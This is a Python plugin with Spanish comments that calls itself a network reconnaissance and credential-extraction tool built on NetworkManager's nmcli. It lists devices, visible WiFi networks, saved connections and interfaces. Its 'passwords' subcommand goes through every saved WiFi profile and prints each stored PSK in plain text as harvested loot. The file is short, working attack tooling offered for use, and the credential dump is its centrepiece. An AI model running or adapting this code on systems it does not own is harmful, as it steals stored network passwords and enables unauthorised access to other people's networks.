"""
Plugin !nmcli — reconocimiento y extracción de credenciales de red via NetworkManager.
!nmcli            → resumen: dispositivos + conexiones activas
!nmcli wifi       → redes WiFi visibles
!nmcli saved      → conexiones guardadas (incluye SSIDs)
!nmcli passwords  → recupera contraseñas WiFi almacenadas (requiere root o grupo netdev)
!nmcli ifaces     → interfaces y sus IPs
"""

import subprocess
import shutil


def _run(*cmd) -> tuple[int, str, str]:
    if not shutil.which(cmd[0]):
        return 1, "", f"{cmd[0]} no encontrado en PATH"
    try:
        r = subprocess.run(list(cmd), capture_output=True, text=True, timeout=10)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        return 1, "", "timeout ejecutando nmcli"
    except Exception as exc:
        return 1, "", str(exc)


def run(args: str) -> tuple[int, str, str]:
    cmd = args.strip().lower()

    if cmd == "" or cmd == "status":
        code, out, err = _run("nmcli", "-p", "general", "status")
        _, dev_out, _ = _run("nmcli", "-p", "device", "status")
        _, con_out, _ = _run("nmcli", "-p", "connection", "show", "--active")
        return code, "\n\n".join(filter(None, [out, dev_out, con_out])), err

    if cmd == "wifi":
        return _run("nmcli", "-p", "device", "wifi", "list")

    if cmd == "saved":
        return _run("nmcli", "-p", "connection", "show")

    if cmd == "passwords":
        # Lista todas las conexiones WiFi guardadas con su contraseña
        _, connections_raw, _ = _run("nmcli", "-t", "-f", "NAME,TYPE", "connection", "show")
        wifi_conns = [
            line.split(":")[0]
            for line in connections_raw.splitlines()
            if ":802-11-wireless" in line
        ]
        if not wifi_conns:
            return 0, "No se encontraron conexiones WiFi guardadas", ""

        results = ["[+] Contraseñas WiFi guardadas:\n"]
        for ssid in wifi_conns:
            rc, out, err = _run("nmcli", "-s", "-g",
                                "802-11-wireless.ssid,802-11-wireless-security.psk",
                                "connection", "show", ssid)
            if rc == 0 and out:
                parts = out.split("\n")
                ssid_val = parts[0] if parts else ssid
                psk_val  = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "(sin contraseña / red abierta)"
                results.append(f"  SSID: {ssid_val}")
                results.append(f"  PSK:  {psk_val}\n")
            else:
                results.append(f"  {ssid}: sin permisos para leer PSK\n")
        return 0, "\n".join(results), ""

    if cmd == "ifaces":
        return _run("nmcli", "-p", "device", "show")

    return 1, "", "Uso: !nmcli [status|wifi|saved|passwords|ifaces]"
